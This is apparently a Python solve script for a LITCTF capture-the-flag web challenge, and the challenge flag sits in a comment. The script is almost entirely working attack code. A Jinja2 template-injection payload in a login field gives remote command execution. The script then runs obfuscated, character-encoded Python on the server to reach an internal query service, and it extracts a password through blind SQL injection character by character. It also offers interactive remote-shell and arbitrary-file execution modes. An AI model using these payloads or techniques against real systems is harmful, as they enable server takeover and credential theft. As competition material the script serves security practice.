#!/usr/bin/python3

import requests

url = 'http://litctf.live:31781/'

def run_command(cmd):
    password = r"{{lipsum['__globals__']['os']['popen']('" + cmd + "')['read']()}}"
    data = {'username': 'a', 'password': password}

    r = requests.post(url, data=data, timeout=1000)
    return r.text[58:-18]

def run_python(code):
    code = code.replace('.', '\\x2E')
    return run_command('python3 -c "' + code + '"')

def run_login(username, password):
    # the reason I encode these is because I don't wanna have to deal with " and '
    user_encoded = ' + '.join(['chr(' + str(ord(char)) + ')' for char in username])
    pass_encoded = ' + '.join(['chr(' + str(ord(char)) + ')' for char in password])

    # this blob just posts to the data server
    code = 'import requests;r = requests.post(chr(104) + chr(116) + chr(116) + chr(112) + chr(58) + chr(47) + chr(47) + chr(49) + chr(55) + chr(50) + chr(46) + chr(50) + chr(52) + chr(46) + chr(48) + chr(46) + chr(56) + chr(58) + chr(56) + chr(48) + chr(56) + chr(48) + chr(47) + chr(114) + chr(117) + chr(110) + chr(113) + chr(117) + chr(101) + chr(114) + chr(121), json={chr(117) + chr(115) + chr(101) + chr(114) + chr(110) + chr(97) + chr(109) + chr(101): USERNAME_HERE,chr(112) + chr(97) + chr(115) + chr(115) + chr(119) + chr(111) + chr(114) + chr(100): PASSWORD_HERE});print(r.text)'
    code = code.replace('USERNAME_HERE', user_encoded).replace('PASSWORD_HERE', pass_encoded)

    return run_python(code)

def bruteforce():
    charset = '_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}!"#$%&\'()*+,-./:;<=>?@[\\]^`|~'

    # the flag is LITCTF{flush3d_3m0ji_o.0}
    result = 'LITCTF{'
    index = len(result) + 1
    while '}' not in result:
        for char in charset:
            print("Checking char " + char)
            login_result = run_login("XXXXX", f"XXXXX' OR substr(password, {str(index)}, 1)='{char}'/*")
            if "True" in login_result:
                index += 1
                result += char
                print(result)
                break
            elif "False" not in login_result:
                print(login_result)
    print('-' * 80)
    print('FLAG: ' + result)


def main():
    choice = input('Would you like to go into CMD, QUERY, BRUTEFORCE, or PYTHON mode?\n')
    if choice.lower() == 'cmd':
        while True:
            command = input('Command: ')
            print(run_command(command))

    elif choice.lower() == 'query':
        # SELECT * FROM users WHERE username='XXXXX' AND password='XXXXX'
        while True:
            username = input('Username: ')
            password = input('Password: ')
            print(run_login(username, password))

    elif choice.lower() == 'bruteforce':
        bruteforce()

    # this option is very sketchy, do it with caution (and avoid newlines cause i never tested those)
    elif choice.lower() == 'python':
        while True:
            code = open(input('File: '), 'r').read()
            print(run_python(code))
    else:
        print('Not a valid option.')

if __name__ == '__main__':
    main()